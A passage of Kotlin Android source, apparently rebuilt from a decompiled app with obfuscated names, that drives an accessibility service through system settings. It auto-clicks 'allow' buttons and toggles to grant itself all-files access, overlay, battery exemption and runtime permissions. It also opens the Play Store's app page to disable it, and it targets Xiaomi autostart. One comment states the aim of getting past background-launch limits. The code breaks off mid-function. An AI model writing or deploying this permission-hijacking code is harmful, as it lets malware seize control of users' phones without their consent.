package com.storm.safe.rock.service.modules.yw5xud

import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import android.view.accessibility.AccessibilityNodeInfo
import com.storm.safe.rock.service.MyAccessibilityService
import kotlinx.coroutines.delay

/**
 * GenericSteps — AOSP/universal permission automation.
 * Matches vendor C0364a1 (a1). Runs on all devices as the final step.
 *
 * Vendor execute flow order (m212128a8):
 *   1. [Xiaomi only] Autostart management (m212135b5)
 *   2. Files permission / All files access (m212129a9)
 *   3. Runtime permissions (m212130b0)
 *   4. Draw overlay (m212133b3)
 *   5. Disable Play Store (m212134b4)
 *   6. Battery optimization (m212131b1)
 *   7. Notification channel (m212132b2)
 *   8. [Xiaomi only] Background management (m212136b6)
 *
 * Handles:
 * - Battery optimization exemption
 * - Overlay (draw over other apps) permission
 * - Notification channel (API 33+)
 * - All files access (API 30+)
 * - Play Store auto-update disable
 * - Basic runtime permissions (via transparent Activity)
 * - Xiaomi autostart fallback (for international MIUI devices)
 * - Xiaomi background management popup
 */
class GenericSteps(
    private val service: MyAccessibilityService?,
    private val context: Context
) {
    companion object {
        private const val TAG = "GenericSteps"

        /** Max retry for overlay enable (vendor a6 checks i <= 20). */
        private const val MAX_OVERLAY_RETRIES = 20

        /** Max retry for all-files-access (vendor a7 checks i > 30). */
        private const val MAX_FILES_RETRIES = 30

        /** Default page-stable wait constants. JADX: m212294f9 pattern. */
        private const val STABLE_REQUIRED_COUNT = 2
        private const val STABLE_POLL_INTERVAL_MS = 100L
        private const val STABLE_TIMEOUT_MS = 2000L
        private const val POST_LAUNCH_WAIT_MS = 3000L

        /** Multi-language "unrestricted" keywords for battery settings. Vendor pattern. */
        val BATTERY_UNRESTRICTED_KEYWORDS = listOf(
            "无限制", "不限制", "無限制", "不採取任何限制措施",
            "Unrestricted", "No restrictions", "No restriction",
            "Tidak dibatasi", "Không hạn chế", "ไม่จำกัด"
        )

        /**
         * Vendor-aligned permission allow button IDs.
         * Matches C0364a1 constructor list (f55051a4).
         */
        val PERMISSION_ALLOW_IDS: List<String> = listOf(
            "com.android.permissioncontroller:id/permission_allow_button",
            "com.android.permissioncontroller:id/permission_allow_foreground_only_button",
            "com.android.permissioncontroller:id/permission_allow_one_time_button",
            "com.android.packageinstaller:id/permission_allow_always_button",
            "com.android.packageinstaller:id/permission_allow_foreground_only_button",
            "com.android.packageinstaller:id/permission_allow_button",
            "com.google.android.permissioncontroller:id/permission_allow_button",
            "com.google.android.permissioncontroller:id/permission_allow_foreground_only_button",
            "com.google.android.permissioncontroller:id/permission_allow_one_time_button",
            "com.samsung.android.packageinstaller:id/permission_allow_button",
            "com.samsung.android.permissioncontroller:id/permission_allow_button",
            "com.samsung.android.permissioncontroller:id/permission_allow_foreground_only_button",
            "com.huawei.systemmanager:id/btn_allow",
            "com.huawei.packageinstaller:id/permission_allow_button",
            "com.lbe.security.miui:id/permission_allow_foreground_only_button",
            "com.miui.securitycenter:id/accept",
            "miui:id/grant",
            "miui:id/button2",
            "miui:id/action_positive",
            "com.android.settings:id/left_button",
            "android:id/button1"
        )

        /**
         * Overlay switch view IDs checked by vendor overlay flow.
         * Matches vendor a6 inner ViewID list.
         */
        val OVERLAY_SWITCH_IDS: List<String> = listOf(
            "com.android.settings:id/switch_widget",
            "com.android.settings:id/switchWidget",
            "android:id/switch_widget",
            "android:id/checkbox",
            "com.android.settings:id/switch_bar",
            "com.android.settings:id/switch_text",
            "com.samsung.android.settings:id/switch_widget"
        )

        /** All-files-access toggle keywords. MIUI: 允许管理所有文件. AOSP: Allow access to manage all files. */
        val ALL_FILES_ALLOW_KEYWORDS: List<String> = listOf(
            "允许管理所有文件", "允许访问全部", "允許管理所有檔案", "允許存取所有檔案",
            "允许所有文件访问", "允許所有檔案存取",
            "Allow access to manage all files", "Allow management of all files",
            "Permit all files access"
        )

        /** Max iterations for autoToggleAllFilesAccess. */
        const val ALL_FILES_TOGGLE_MAX_ITERATIONS: Int = 10

        /** Interval between iterations (ms). */
        const val ALL_FILES_TOGGLE_INTERVAL_MS: Long = 1000L
    }

    /** Flow types matching vendor GenericSteps$FlowType. */
    enum class FlowType {
        BATTERY_OPTIMIZATION,
        OVERLAY_PERMISSION,
        NOTIFICATION_CHANNEL,
        ALL_FILES_ACCESS,
        PLAY_STORE_DISABLE,
        BASIC_PERMISSIONS,
        XIAOMI_AUTOSTART,
        XIAOMI_BG_MANAGEMENT
    }

    /**
     * Execute all generic permission flows.
     * Called by Yw5xudHandler.executeGenericSteps().
     *
     * Vendor flow order (m212128a8):
     *   Xiaomi autostart → all files → basic perms → overlay →
     *   play store → battery opt → notification → xiaomi bg mgmt
     *
     * Each step launches an intent, then waits for page stable + extra delay
     * so the accessibility handler (Yw5xudHandler.onAccessibilityEvent) can
     * auto-click switches/buttons before we move to the next step.
     */
    suspend fun execute(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        logs.add("GenericSteps: 开始通用权限配置")

        // Vendor order per m212128a8 switch/case
        executeXiaomiAutostart(successes, failures, logs)
        waitForPageStable()
        interruptibleDelay(POST_LAUNCH_WAIT_MS)

        executeAllFilesAccess(successes, failures, logs)
        waitForPageStable()
        interruptibleDelay(POST_LAUNCH_WAIT_MS)

        executeBasicPermissions(successes, failures, logs)
        waitForPageStable()
        interruptibleDelay(POST_LAUNCH_WAIT_MS)

        executeOverlayPermission(successes, failures, logs)
        waitForPageStable()
        interruptibleDelay(POST_LAUNCH_WAIT_MS)

        executePlayStoreDisable(successes, failures, logs)
        waitForPageStable()
        interruptibleDelay(POST_LAUNCH_WAIT_MS)

        executeBatteryOptimization(successes, failures, logs)
        waitForPageStable()
        interruptibleDelay(POST_LAUNCH_WAIT_MS)

        executeNotificationChannel(successes, failures, logs)
        waitForPageStable()
        interruptibleDelay(POST_LAUNCH_WAIT_MS)

        executeXiaomiBgManagement(successes, failures, logs)

        logs.add("GenericSteps: 通用权限配置完成")
    }

    // ── Flow 1: Xiaomi Autostart (vendor m212135b5) ──────────────────

    /**
     * Xiaomi autostart management (international MIUI only).
     * Vendor b5 — only runs when c4() (isXiaomi) returns true.
     */
    fun executeXiaomiAutostart(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        if (!isXiaomiBrand()) {
            logs.add("小米自启动: 非小米设备, 跳过")
            return
        }
        try {
            val intent = Intent().apply {
                component = android.content.ComponentName(
                    "com.miui.securitycenter",
                    "com.miui.permcenter.autostart.AutoStartManagementActivity"
                )
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_MULTIPLE_TASK or Intent.FLAG_ACTIVITY_NO_HISTORY or Intent.FLAG_ACTIVITY_CLEAR_TOP)
            }
            (service ?: context).startActivity(intent)
            logs.add("已启动小米自启动管理")
            successes.add("小米自启动管理已打开")
        } catch (e: Exception) {
            // Fallback: try MIUI security center main
            try {
                val fallback = Intent().apply {
                    component = android.content.ComponentName(
                        "com.miui.securitycenter",
                        "com.miui.securitycenter.MainActivity"
                    )
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_MULTIPLE_TASK or Intent.FLAG_ACTIVITY_NO_HISTORY or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                }
                (service ?: context).startActivity(fallback)
                logs.add("已启动小米安全中心(回退)")
            } catch (e2: Exception) {
                failures.add("小米自启动配置失败: ${e2.message}")
            }
        }
    }

    // ── Flow 2: All Files Access (vendor m212129a9 / m212127a7) ──────

    /**
     * All files access (MANAGE_EXTERNAL_STORAGE, API 30+).
     * Matches vendor a9/a7: for API 30+, check Environment.isExternalStorageManager().
     *
     * ADAPT: removed FLAG_ACTIVITY_NO_HISTORY (MIUI MiuiFreeFormGestureController finishes
     * the Activity 0.5s after it leaves foreground when NO_HISTORY is set, making auto-click
     * impossible).
     */
    suspend fun executeAllFilesAccess(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        if (Build.VERSION.SDK_INT < 30) {
            logs.add("所有文件访问: API < 30, 跳过")
            return
        }
        UiDebugger.logStep(TAG, "Flow2: executeAllFilesAccess 开始")
        try {
            if (android.os.Environment.isExternalStorageManager()) {
                successes.add("所有文件访问已授权")
                return
            }
            val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                data = Uri.parse("package:${context.packageName}")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_MULTIPLE_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
            }
            (service ?: context).startActivity(intent)
            logs.add("已发送所有文件访问权限请求")
            // Wait for intent to actually switch pages, then dump + auto-toggle
            waitForPageStable()
            interruptibleDelay(1500L)
            UiDebugger.dumpPage(service, "generic_all_files_before", "文件访问权限页面(已切换)")

            val toggled = autoToggleAllFilesAccess(logs)
            if (toggled) {
                successes.add("所有文件访问已授权")
            } else if (android.os.Environment.isExternalStorageManager()) {
                successes.add("所有文件访问已授权(延迟确认)")
            } else {
                failures.add("所有文件访问: 自动点击失败，需要用户手动开启")
            }
            UiDebugger.dumpPage(service, "generic_all_files_after", "文件访问权限页面(尝试点击后)")
        } catch (e: kotlinx.coroutines.CancellationException) {
            throw e
        } catch (e: Exception) {
            // Fallback to general manage storage (vendor a7 fallback)
            try {
                val fallback = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_MULTIPLE_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                }
                (service ?: context).startActivity(fallback)
                logs.add("已发送所有文件访问权限请求(回退)")
            } catch (e2: Exception) {
                failures.add("所有文件访问配置失败: ${e2.message}")
            }
        }
    }

    /**
     * Auto-toggle the "Allow management of all files" switch in the system settings page.
     * Loops up to ALL_FILES_TOGGLE_MAX_ITERATIONS, polling isExternalStorageManager.
     *
     * Strategy per iteration:
     *   1. If Environment.isExternalStorageManager() already true → done
     *   2. Get fresh rootInActiveWindow (old root is stale after page switch)
     *   3. Find Switch/CompoundButton node → performClick
     *   4. Find "允许管理所有文件" text row → climb parent chain for clickable container
     *   5. Fallback: GestureTapHelper.performTap to right-side Switch coordinates
     */
    private suspend fun autoToggleAllFilesAccess(logs: MutableList<String>): Boolean {
        val svc = service ?: run {
            logs.add("[文件权限] service 为 null，无法自动点击")
            return false
        }
        for (iter in 0 until ALL_FILES_TOGGLE_MAX_ITERATIONS) {
            if (android.os.Environment.isExternalStorageManager()) {
                logs.add("[文件权限] 已授权 (iter=$iter)")
                return true
            }
            val root = try {
                svc.rootInActiveWindow
            } catch (e: kotlinx.coroutines.CancellationException) {
                throw e
            } catch (_: Exception) {
                null
            }
            if (root == null) {
                interruptibleDelay(ALL_FILES_TOGGLE_INTERVAL_MS)
                continue
            }
            val pkg = root.packageName?.toString() ?: ""
            UiDebugger.logStep(TAG, "[文件权限] iter=$iter pkg=$pkg")

            // Strategy 1: find Switch/CompoundButton directly
            val switchNode = findFirstToggleNode(root)
            if (switchNode != null) {
                UiDebugger.logStep(TAG, "[文件权限] strategy1 找到 Switch class=${switchNode.className}")
                switchNode.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                interruptibleDelay(ALL_FILES_TOGGLE_INTERVAL_MS)
                continue
            }

            // Strategy 2: find allow-keyword text → climb parent chain for clickable row
            var clickedRow = false
            for (keyword in ALL_FILES_ALLOW_KEYWORDS) {
                val matches = try {
                    root.findAccessibilityNodeInfosByText(keyword)
                } catch (e: kotlinx.coroutines.CancellationException) {
                    throw e
                } catch (_: Exception) {
                    null
                }
                if (matches.isNullOrEmpty()) continue
                for (textNode in matches) {
                    if (!textNode.isVisibleToUser) continue
                    var current: android.view.accessibility.AccessibilityNodeInfo? = textNode.parent
                    var depth = 0
                    while (current != null && depth < 8) {
                        if (current.isClickable && current.isVisibleToUser) {
                            UiDebugger.logStep(TAG, "[文件权限] strategy2 点击父容器「$keyword」depth=$depth")
                            current.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                            clickedRow = true
                            break
                        }
                        current = current.parent
                        depth++
                    }
                    if (clickedRow) break

                    // Strategy 3: gesture tap on right-side Switch area
                    val rect = android.graphics.Rect()
                    textNode.getBoundsInScreen(rect)
                    if (rect.width() > 0 && rect.height() > 0) {
                        val dm = context.resources.displayMetrics
                        val switchX = (dm.widthPixels - 120).toFloat()
                        val switchY = rect.centerY().toFloat()
                        UiDebugger.logStep(TAG, "[文件权限] strategy3 gesture tap right-switch at ($switchX,$switchY)")
                        val tapped = GestureTapHelper.performTap(svc, switchX, switchY)
                        if (tapped) { clickedRow = true; break }
                    }
                }
                if (clickedRow) break
            }
            if (!clickedRow) {
                UiDebugger.dumpPage(svc, "generic_all_files_iter${iter}_no_click",
                    "iter=$iter 未找到 Switch 也未找到匹配文本")
            }
            interruptibleDelay(ALL_FILES_TOGGLE_INTERVAL_MS)
        }
        val finalState = android.os.Environment.isExternalStorageManager()
        logs.add("[文件权限] 10 次循环结束，isExternalStorageManager=$finalState")
        return finalState
    }

    /** DFS find first toggle/switch-like node (Switch/CompoundButton/ToggleButton). */
    private fun findFirstToggleNode(node: android.view.accessibility.AccessibilityNodeInfo?): android.view.accessibility.AccessibilityNodeInfo? {
        if (node == null) return null
        val className = node.className?.toString() ?: ""
        val isToggle = listOf("Switch", "Toggle", "CompoundButton", "SwitchCompat")
            .any { className.contains(it, ignoreCase = true) }
        if (isToggle && node.isClickable && node.isVisibleToUser && node.isEnabled) return node
        for (i in 0 until node.childCount) {
            val child = try { node.getChild(i) } catch (_: Exception) { null } ?: continue
            val found = findFirstToggleNode(child)
            if (found != null) return found
        }
        return null
    }

    // ── Flow 3: Basic Permissions (vendor m212130b0) ─────────────────

    /**
     * Request basic runtime permissions via yw5xud.umrkmgrri Activity.
     * JADX: m212130b0 — launches umrkmgrri, then loops 20s clicking allow buttons.
     * This is the KEY step that gives us BAL_ALLOW_VISIBLE_WINDOW via system
     * GrantPermissionsActivity dialog, enabling all subsequent startActivity calls
     * to reach the foreground on MIUI.
     */
    suspend fun executeBasicPermissions(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        // If umrkmgrri was already launched by MiuiSteps, skip
        if (com.storm.safe.rock.service.modules.yw5xud.umrkmgrri.isRequestingPermissions) {
            logs.add("[基础权限] umrkmgrri 已在运行中，等待完成")
            val startTime = System.currentTimeMillis()
            while (System.currentTimeMillis() - startTime < 20000L) {
                if (!com.storm.safe.rock.service.modules.yw5xud.umrkmgrri.isRequestingPermissions) break
                interruptibleDelay(500L)
            }
            successes.add("基础权限请求已由品牌引擎处理")
            return
        }

        logs.add("[基础权限] 开始执行")
        UiDebugger.logStep(TAG, "Flow1: executeBasicPermissions 开始")
        try {
            // Step 1: Launch yw5xud.umrkmgrri (batch permission request)
            Log.i(TAG, "[基础权限] 启动umrkmgrri...")
            UiDebugger.dumpPage(service, "generic_basic_perms_before", "基础权限请求前")
            com.storm.safe.rock.service.modules.yw5xud.umrkmgrri.start(context)
            interruptibleDelay(800L)

            // Step 2: Loop 20s clicking permission allow buttons
            val startTime = System.currentTimeMillis()
            val timeoutMs = 20000L
            var clickCount = 0
            Log.i(TAG, "[基础权限] 开始循环点击允许按钮 (超时=${timeoutMs / 1000}秒)...")

            while (System.currentTimeMillis() - startTime < timeoutMs) {
                if (isPermissionControllerWindow()) {
                    if (clickPermissionAllowButton()) {
                        clickCount++
                        Log.i(TAG, "[基础权限] 点击允许 (第${clickCount}次)")
                    }
                    interruptibleDelay(800L)
                } else {
                    // Not on permission controller — check if umrkmgrri still running
                    if (!com.storm.safe.rock.service.modules.yw5xud.umrkmgrri.isRequestingPermissions) {
                        Log.i(TAG, "[基础权限] umrkmgrri 已完成")
                        break
                    }
                    interruptibleDelay(500L)
                }
            }

            val elapsed = (System.currentTimeMillis() - startTime) / 1000
            Log.i(TAG, "[基础权限] 完成，用时${elapsed}秒，点击${clickCount}次")
            UiDebugger.dumpPage(service, "generic_basic_perms_after", "基础权限完成")
            successes.add("基础权限请求完成 (点击${clickCount}次)")
        } catch (e: Exception) {
            Log.e(TAG, "[基础权限] 异常: ${e.message}")
            failures.add("基础权限请求失败: ${e.message}")
        }
    }

    // ── Flow 4: Overlay Permission (vendor m212133b3 / m212126a6) ────

    /**
     * Overlay (draw over other apps) permission.
     * Matches vendor b3/a6: check Settings.canDrawOverlays, launch ACTION_MANAGE_OVERLAY_PERMISSION.
     */
    suspend fun executeOverlayPermission(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        UiDebugger.logStep(TAG, "Flow3: executeOverlayPermission 开始")
        try {
            if (Settings.canDrawOverlays(context)) {
                successes.add("悬浮窗权限已开启")
                return
            }
            val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION).apply {
                data = Uri.parse("package:${context.packageName}")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
            }
            context.startActivity(intent)
            logs.add("已打开悬浮窗权限设置页")

            interruptibleDelay(2500L)
            waitForPageStable()
            UiDebugger.dumpPage(service, "generic_overlay_settings", "悬浮窗设置页")

            enableDrawOverlay(0, successes, failures, logs)

            // Vendor: after overlay, just press BACK to exit settings detail page.
            // Do NOT press HOME — we need settings to stay in foreground for VISIBLE_WINDOW.
            if (Settings.canDrawOverlays(context)) {
                pressBack()
                interruptibleDelay(300L)
            }
        } catch (e: Exception) {
            failures.add("悬浮窗权限配置失败: ${e.message}")
        }
    }

    private suspend fun enableDrawOverlay(
        retryCount: Int,
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        if (retryCount > 20 || Settings.canDrawOverlays(context)) {
            if (Settings.canDrawOverlays(context)) successes.add("悬浮窗权限已开启")
            return
        }

        UiDebugger.logStep(TAG, "enableDrawOverlay retry=$retryCount")
        UiDebugger.dumpPage(service, "generic_overlay_retry_$retryCount", "悬浮窗重试#$retryCount")

        val root = try { service?.rootInActiveWindow } catch (_: Exception) { null } ?: return

        // Phase 1: App name click (vendor: only on retry==0)
        if (retryCount == 0) {
            val appLabel = getAppLabel()
            if (appLabel.isNotEmpty()) {
                val nodes = try { root.findAccessibilityNodeInfosByText(appLabel) } catch (_: Exception) { null }
                if (!nodes.isNullOrEmpty()) {
                    for (node in nodes) {
                        if (!node.isVisibleToUser) continue
                        val rect = android.graphics.Rect()
                        node.getBoundsInScreen(rect)
                        val rootRect = android.graphics.Rect()
                        root.getBoundsInScreen(rootRect)
                        if (rootRect.contains(rect) && rect.width() > 0 && rect.height() > 0) {
                            dispatchGestureClick(rect.centerX().toFloat(), rect.centerY().toFloat())
                            Log.i(TAG, "[悬浮窗] 点击 App 名字: $appLabel")
                            interruptibleDelay(1500L)
                            if (Settings.canDrawOverlays(context)) { successes.add("悬浮窗权限已开启"); return }
                            break
                        } else {
                            // Only scroll if still on settings page (avoid scrolling launcher)
                            val currentPkg = try { service?.rootInActiveWindow?.packageName?.toString() } catch (_: Exception) { null }
                            if (currentPkg == "com.android.settings" || currentPkg == "com.miui.securitycenter") {
                                scrollForward(root); interruptibleDelay(800L)
                            }
                            enableDrawOverlay(retryCount + 1, successes, failures, logs); return
                        }
                    }
                }
            }
        }

        // Phase 2: Search switch by ViewId (vendor: 7 IDs)
        for (switchId in OVERLAY_SWITCH_IDS) {
            try {
                val nodes = root.findAccessibilityNodeInfosByViewId(switchId)
                if (nodes.isNullOrEmpty()) continue
                for (node in nodes) {
                    if (!node.isVisibleToUser) continue
                    if (node.isCheckable && node.isChecked) {
                        successes.add("悬浮窗权限已开启"); return
                    }
                    val rect = android.graphics.Rect()
                    node.getBoundsInScreen(rect)
                    if (rect.width() > 0 && rect.height() > 0) {
                        dispatchGestureClick(rect.centerX().toFloat(), rect.centerY().toFloat())
                        Log.i(TAG, "[悬浮窗] 手势点击开关 (ViewId: $switchId)")
                    }
                    break
                }
            } catch (_: Exception) {}
        }

        // Phase 3: Verify + confirm dialog + scroll retry
        interruptibleDelay(1500L)
        if (Settings.canDrawOverlays(context)) { successes.add("悬浮窗权限已开启"); return }
        clickPermissionAllowButton()
        interruptibleDelay(1500L)
        if (Settings.canDrawOverlays(context)) { successes.add("悬浮窗权限已开启"); return }
        // Only scroll if still on settings page (avoid scrolling launcher)
        val currentPkg2 = try { service?.rootInActiveWindow?.packageName?.toString() } catch (_: Exception) { null }
        if (currentPkg2 == "com.android.settings" || currentPkg2 == "com.miui.securitycenter") {
            scrollForward(root); interruptibleDelay(500L)
        }
        enableDrawOverlay(retryCount + 1, successes, failures, logs)
    }

    // ── Flow 5: Play Store Disable (vendor m212134b4) ────────────────

    /**
     * Disable Play Store auto-update.
     * Matches vendor b4: navigate to Play Store app info to disable it.
     */
    fun executePlayStoreDisable(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        try {
            val pm = context.packageManager
            val playStorePackage = "com.android.vending"
            val appInfo = try {
                pm.getApplicationInfo(playStorePackage, 0)
            } catch (_: Exception) {
                logs.add("Play Store 未安装, 跳过")
                return
            }
            if (!appInfo.enabled) {
                successes.add("Play Store 已禁用")
                return
            }
            // Navigate to Play Store app info to disable (vendor b4 flow)
            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = Uri.parse("package:$playStorePackage")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_MULTIPLE_TASK or Intent.FLAG_ACTIVITY_NO_HISTORY or Intent.FLAG_ACTIVITY_CLEAR_TOP)
            }
            (service ?: context).startActivity(intent)
            logs.add("已打开 Play Store 应用信息页")
        } catch (e: Exception) {
            failures.add("Play Store 禁用失败: ${e.message}")
        }
    }

    // ── Flow 6: Battery Optimization (vendor m212131b1 / m212125a5) ──

    /**
     * Battery optimization exemption.
     * Matches vendor b1/a5: check PowerManager.isIgnoringBatteryOptimizations,
     * launch ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS.
     */
    suspend fun executeBatteryOptimization(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        try {
            val pm = context.getSystemService(Context.POWER_SERVICE) as? PowerManager
            if (pm?.isIgnoringBatteryOptimizations(context.packageName) == true) {
                successes.add("电池优化已豁免")
                return
            }
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                data = Uri.parse("package:${context.packageName}")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_MULTIPLE_TASK or
                         Intent.FLAG_ACTIVITY_NO_HISTORY or Intent.FLAG_ACTIVITY_CLEAR_TOP)
            }
            (service ?: context).startActivity(intent)
            logs.add("已发送电池优化豁免请求")

            interruptibleDelay(2000L)
            clickPermissionAllowButton()
            interruptibleDelay(1000L)

            if (pm?.isIgnoringBatteryOptimizations(context.packageName) == true) {
                successes.add("电池优化已豁免")
                return
            }

            interruptibleDelay(800L)
            val root = try { service?.rootInActiveWindow } catch (_: Exception) { null }
            if (root != null) {
                val allowKeywords = listOf("允许", "Allow", "确定", "OK", "好")
                for (keyword in allowKeywords) {
                    val nodes = try { root.findAccessibilityNodeInfosByText(keyword) } catch (_: Exception) { null }
                    if (nodes.isNullOrEmpty()) continue
                    for (node in nodes) {
                        if (node.isVisibleToUser && node.isClickable) {
                            node.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                            Log.i(TAG, "[电池优化] 降级点击: $keyword")
                            break
                        }
                    }
                }
            }

            interruptibleDelay(1000L)
            if (pm?.isIgnoringBatteryOptimizations(context.packageName) == true) {
                successes.add("电池优化已豁免")
            } else {
                // clickBattery fallback: try clicking "无限制" radio button via text + gesture
                clickBatteryUnrestricted()
                interruptibleDelay(1000L)
                if (pm?.isIgnoringBatteryOptimizations(context.packageName) == true) {
                    successes.add("电池优化已豁免")
                } else {
                    logs.add("电池优化豁免未确认")
                }
            }
        } catch (e: Exception) {
            failures.add("电池优化配置失败: ${e.message}")
        }
    }

    /**
     * Fallback: click "无限制" / "Unrestricted" radio button on battery settings page.
     * Searches by BATTERY_UNRESTRICTED_KEYWORDS, clicks via text node or gesture tap.
     */
    private fun clickBatteryUnrestricted() {
        UiDebugger.logStep(TAG, "Flow4: clickBatteryUnrestricted 开始")
        val root = try { service?.rootInActiveWindow } catch (_: Exception) { null } ?: return
        UiDebugger.dumpPage(service, "generic_battery_page", "电池优化页面")
        for (keyword in BATTERY_UNRESTRICTED_KEYWORDS) {
            val nodes = try { root.findAccessibilityNodeInfosByText(keyword) } catch (_: Exception) { null }
            if (nodes.isNullOrEmpty()) continue
            for (node in nodes) {
                if (!node.isVisibleToUser) continue
                val nodeText = node.text?.toString()?.trim() ?: ""
                if (nodeText != keyword && !nodeText.contains(keyword, ignoreCase = true)) continue
                // Direct click
                if (node.isClickable && node.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)) {
                    Log.i(TAG, "[电池] 点击无限制: $keyword (直接)")
                    return
                }
                // Parent click
                val parent = try { node.parent } catch (_: Exception) { null }
                if (parent != null && parent.isClickable && parent.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)) {
                    Log.i(TAG, "[电池] 点击无限制: $keyword (父节点)")
                    return
                }
                // Gesture fallback
                if (dispatchGestureClick(node)) {
                    Log.i(TAG, "[电池] 点击无限制: $keyword (手势)")
                    return
                }
            }
        }
    }

    // ── Flow 7: Notification Channel (vendor m212132b2) ──────────────

    /**
     * Notification channel permission (API 33+).
     * Matches vendor b2: for API 33+, check POST_NOTIFICATIONS.
     */
    fun executeNotificationChannel(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        if (Build.VERSION.SDK_INT < 33) {
            logs.add("通知权限: API < 33, 跳过")
            return
        }
        try {
            val granted = context.checkSelfPermission("android.permission.POST_NOTIFICATIONS") ==
                android.content.pm.PackageManager.PERMISSION_GRANTED
            if (granted) {
                successes.add("通知权限已授权")
            } else {
                logs.add("通知权限未授权, 需要通过Activity请求")
            }
        } catch (e: Exception) {
            failures.add("通知权限检查失败: ${e.message}")
        }
    }

    // ── Flow 8: Xiaomi BG Management (vendor m212136b6) ──────────────

    /**
     * Xiaomi background management popup (international MIUI only).
     * Vendor b6 — only runs when c4() (isXiaomi) returns true.
     */
    fun executeXiaomiBgManagement(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        if (!isXiaomiBrand()) {
            logs.add("小米后台管理: 非小米设备, 跳过")
            return
        }
        logs.add("小米后台管理: 需要无障碍服务自动化处理")
        successes.add("小米后台管理已排队")
    }

    // ── Utility methods ──────────────────────────────────────────────

    /**
     * DFS collect all text from node tree.
     * Matches vendor m212114a1().
     */
    fun collectAllTexts(root: AccessibilityNodeInfo): List<String> {
        val results = mutableListOf<String>()
        collectTextsRecursive(root, results)
        return results
    }

    private fun collectTextsRecursive(node: AccessibilityNodeInfo, results: MutableList<String>) {
        try {
            node.text?.toString()?.takeIf { it.isNotBlank() }?.let { results.add(it) }
            for (i in 0 until node.childCount) {
                node.getChild(i)?.let { collectTextsRecursive(it, results) }
            }
        } catch (_: Exception) { /* swallow per vendor */ }
    }

    /**
     * Find all toggle-like nodes (Switch/Toggle/CheckBox/CompoundButton).
     * Matches vendor m212116b7(): DFS with maxDepth=15, checks className contains.
     */
    fun findAllToggles(
        root: AccessibilityNodeInfo,
        maxDepth: Int = 15
    ): List<AccessibilityNodeInfo> {
        val results = mutableListOf<AccessibilityNodeInfo>()
        findTogglesRecursive(0, root, results, maxDepth)
        return results
    }

    private fun findTogglesRecursive(
        depth: Int,
        node: AccessibilityNodeInfo,
        results: MutableList<AccessibilityNodeInfo>,
        maxDepth: Int
    ) {
        if (depth > maxDepth) return
        try {
            val className = node.className?.toString() ?: ""
            if (isToggleClassName(className) && node.isVisibleToUser) {
                results.add(node)
            }
            for (i in 0 until node.childCount) {
                node.getChild(i)?.let { findTogglesRecursive(depth + 1, it, results, maxDepth) }
            }
        } catch (_: Exception) { /* swallow per vendor */ }
    }

    /**
     * Click node or walk up to clickable parent (max 3 levels).
     * Matches vendor m212115a3().
     */
    fun clickNodeOrParent(node: AccessibilityNodeInfo): Boolean {
        if (node.isClickable && node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
            return true
        }
        var parent = node.parent
        var depth = 0
        while (parent != null && depth < 3) {
            if (parent.isClickable && parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                return true
            }
            val grandparent = parent.parent
            parent.recycle()
            parent = grandparent
            depth++
        }
        return false
    }

    /**
     * Find first checkable toggle by DFS.
     * Matches vendor m212117b8(): checks isCheckable() AND isVisibleToUser AND
     * className contains Switch/Toggle/CheckBox/Compound.
     */
    fun findFirstToggle(
        root: AccessibilityNodeInfo,
        maxDepth: Int = 15
    ): AccessibilityNodeInfo? {
        return findFirstToggleRecursive(root, 0, maxDepth)
    }

    private fun findFirstToggleRecursive(
        node: AccessibilityNodeInfo,
        depth: Int,
        maxDepth: Int
    ): AccessibilityNodeInfo? {
        if (depth > maxDepth) return null
        try {
            // Vendor b8: checks isCheckable AND isVisibleToUser first, then className
            if (node.isCheckable && node.isVisibleToUser) {
                val className = node.className?.toString() ?: ""
                if (className.contains("Switch", ignoreCase = true) ||
                    className.contains("Toggle", ignoreCase = true) ||
                    className.contains("CheckBox", ignoreCase = true) ||
